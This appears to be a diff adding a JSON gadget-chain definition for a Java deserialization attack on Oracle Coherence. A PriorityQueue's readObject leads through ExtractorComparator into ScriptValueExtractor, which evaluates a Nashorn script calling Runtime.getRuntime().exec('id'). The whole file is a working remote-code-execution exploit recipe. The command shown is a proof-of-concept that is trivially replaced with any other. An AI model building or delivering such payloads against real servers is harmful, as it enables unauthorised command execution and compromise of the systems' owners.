@@ -1,0 +1,21 @@
+{
+  "chain_type": "Coherence ScriptValueExtractor — Nashorn script eval",
+  "root_class": "java.util.PriorityQueue",
+  "root_trigger": "readObject→heapify→comparator.compare→ExtractorComparator.compare→ScriptValueExtractor.extract",
+  "links": [
+    {
+      "class": "com.tangosol.util.comparator.ExtractorComparator",
+      "field_overrides": {
+        "m_extractor": {"$ref": "link:1"}
+      }
+    },
+    {
+      "class": "com.tangosol.util.extractor.ScriptValueExtractor",
+      "field_overrides": {
+        "m_sLanguage": "js",
+        "m_sScript": "java.lang.Runtime.getRuntime().exec('id')"
+      }
+    }
+  ],
+  "sink_method": "ScriptEngine.eval"
+}
